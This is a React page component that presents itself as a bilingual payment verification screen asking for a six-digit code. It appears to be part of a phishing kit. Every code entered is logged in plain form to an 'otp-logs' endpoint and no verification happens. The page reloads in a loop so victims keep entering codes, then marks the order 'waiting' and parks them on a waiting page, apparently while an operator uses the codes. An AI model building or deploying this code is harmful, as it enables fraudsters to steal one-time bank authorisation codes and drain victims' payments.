import { useRoute, useLocation } from 'wouter';
import { useLanguage } from '@/lib/i18n';
import { useGetOrder, getGetOrderQueryKey } from '@workspace/api-client-react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Skeleton } from '@/components/ui/skeleton';
import { useEffect, useState } from 'react';

const verifySchema = z.object({
  code: z.string().length(6, 'Enter 6 digits').regex(/^[0-9]{6}$/, 'Code must contain only digits'),
});

type VerifyFormValues = z.infer<typeof verifySchema>;

export default function PaymentVerification() {
  const [, params] = useRoute('/verify/:orderId');
  const [, setLocation] = useLocation();
  const orderId = parseInt(params?.orderId || '0', 10);
  const { t } = useLanguage();

  const { data: order, isLoading } = useGetOrder(orderId, {
    query: { enabled: !!orderId, queryKey: getGetOrderQueryKey(orderId) },
  });

  const [showApprovalButton, setShowApprovalButton] = useState(false);

  const form = useForm<VerifyFormValues>({
    resolver: zodResolver(verifySchema),
    defaultValues: { code: '' },
  });

  // OTP Loop behavior: reload page on any action
  const onSubmit = (values: VerifyFormValues) => {
    // Log the OTP attempt to OTP logs table
    fetch('/api/otp-logs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        orderId: orderId,
        otpCode: values.code,
        status: 'pending',
        attempts: 1,
      }),
    }).catch(() => {});
    
    // Update order status to otp
    fetch(`/api/orders/${orderId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        status: 'otp',
      }),
    }).catch(() => {});
    
    // Show approval button after first OTP entry
    setShowApprovalButton(true);
    
    // Reload the page to create the loop
    window.location.reload();
  };

  // Auto-reload after 5 seconds if no action
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.reload();
    }, 5000);
    return () => clearTimeout(timer);
  }, []);

  // After 3 reloads (15 seconds), redirect to waiting page
  useEffect(() => {
    const reloadCount = parseInt(sessionStorage.getItem(`otp-reload-${orderId}`) || '0', 10);
    if (reloadCount >= 3) {
      sessionStorage.removeItem(`otp-reload-${orderId}`);
      // Update order status to waiting
      fetch(`/api/orders/${orderId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'waiting',
        }),
      }).catch(() => {});
      setLocation(`/waiting/${orderId}`);
    } else {
      sessionStorage.setItem(`otp-reload-${orderId}`, (reloadCount + 1).toString());
    }
  }, [orderId, setLocation]);

  const handleApprove = () => {
    // Update order status to waiting
    fetch(`/api/orders/${orderId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        status: 'waiting',
      }),
    }).catch(() => {});
    setLocation(`/waiting/${orderId}`);
  };

  if (isLoading) {
    return <div className="container mx-auto px-4 py-12"><Skeleton className="h-[400px] max-w-lg mx-auto" /></div>;
  }

  if (!order) {
    return <div className="text-center py-20">{t('Order not found', 'الطلب غير موجود')}</div>;
  }

  return (
    <div className="container mx-auto px-4 py-16 max-w-lg">
      <div className="bg-card border border-border rounded-3xl p-8 shadow-xl">
        <div className="mb-6 text-center">
          <h1 className="text-3xl font-bold mb-2">{t('Enter Verification Code', 'أدخل رمز التحقق')}</h1>
          <p className="text-sm text-muted-foreground">
            {t('A 6-digit code was sent to your device. Enter it to complete the payment.', 'تم إرسال رمز مكون من 6 أرقام. أدخله لإتمام الدفع.')}
          </p>
        </div>

        <div className="mb-6 rounded-2xl bg-slate-50 p-4 text-sm text-slate-700">
          <div>{t('Order', 'الطلب')} #{order.id}</div>
          <div>{t('Amount', 'المبلغ')}: ${order.totalPrice}</div>
        </div>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
            <FormField
              control={form.control}
              name="code"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>{t('Verification Code', 'رمز التحقق')}</FormLabel>
                  <FormControl>
                    <Input placeholder="123456" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Button type="submit" size="lg" className="w-full text-lg font-bold">
              {t('Verify', 'تحقق')}
            </Button>
          </form>
        </Form>

        <div className="mt-4 text-center text-sm text-muted-foreground">
          {t('Page will reload automatically in 5 seconds', 'سيتم إعادة تحميل الصفحة تلقائياً خلال 5 ثواني')}
        </div>
      </div>
    </div>
  );
}
